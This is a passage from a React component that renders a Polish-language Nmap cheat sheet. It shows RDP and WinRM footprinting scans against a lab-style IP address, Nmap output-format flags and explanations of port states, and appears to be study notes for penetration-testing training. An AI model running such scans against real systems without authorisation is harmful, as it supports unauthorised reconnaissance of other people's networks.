                    </tr>
                    <tr>
                        <td>RDP - script</td>
                        <td>nmap -sV -sC 10.129.201.248 -p3389 --script rdp*</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>WinRM</td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>WinRM - footprinting</td>
                        <td>nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n</td>
                        <td></td>
                    </tr>
                </tbody>
            </table>

            <h2>Opcje Wyjścia</h2>

            <table class="table table-striped text-left">
                <thead>
                    <tr>
                        <th><strong>Nmap Opcja</strong></th>
                        <th><strong>Opis</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>-oA filename</code></td>
                        <td>Przechowuje wyniki we wszystkich dostępnych formatach, zaczynając od nazwy „filename”.</td>
                    </tr>
                    <tr>
                        <td><code>-oN filename</code></td>
                        <td>Przechowuje wyniki w normalnym formacie z nazwą „filename”.</td>
                    </tr>
                    <tr>
                        <td><code>-oG filename</code></td>
                        <td>Przechowuje wyniki w formacie „grepable” z nazwą „filename”.</td>
                    </tr>
                    <tr>
                        <td><code>-oX filename</code></td>
                        <td>Przechowuje wyniki w formacie XML z nazwą „filename”.</td>
                    </tr>
                </tbody>
            </table>

            <table>
                <thead>
                    <tr>
                        <th><strong>Status</strong></th>
                        <th><strong>Opis</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>open</code></td>
                        <td>Oznacza to, że połączenie ze skanowanym portem zostało nawiązane. Połączenia te mogą być połączeniami TCP, datagramami UDP, a także powiązaniami SCTP.</td>
                    </tr>
                    <tr>
                        <td><code>closed</code></td>
                        <td>Gdy port jest wyświetlany jako zamknięty, protokół TCP wskazuje, że otrzymany przez nas pakiet zawiera flagę RST. Tę metodę skanowania można również wykorzystać do ustalenia, czy nasz cel żyje, czy nie.</td>
                    </tr>
                    <tr>
                        <td><code>filtered</code></td>
                        <td>Nmap nie może poprawnie określić, czy przeskanowany port jest otwarty, czy zamknięty, ponieważ albo od celu nie została zwrócona żadna odpowiedź dla portu, albo otrzymaliśmy od celu kod błędu.</td>
                    </tr>
                    <tr>
                        <td><code>unfiltered</code></td>
                        <td>Ten stan portu występuje tylko podczas skanowania TCP-ACK i oznacza, że ​​port jest dostępny, ale nie można określić, czy jest otwarty, czy zamknięty.</td>
                    </tr>
                    <tr>
                        <td><code>open|filtered</code></td>
                        <td>Jeśli nie otrzymamy odpowiedzi dla konkretnego portu, Nmap ustawi go na ten stan. Oznacza to, że zapora sieciowa lub filtr pakietów mogą chronić port.</td>
                    </tr>
                    <tr>
                        <td><code>closed|filtered</code></td>
                        <td>Ten stan występuje tylko podczas skanowań bezczynności identyfikatora IP i wskazuje, że nie można było określić, czy skanowany port jest zamknięty, czy filtrowany przez zaporę ogniową.</td>
                    </tr>
                </tbody>
            </table>
            
        </section>
    )
};

export default Commends;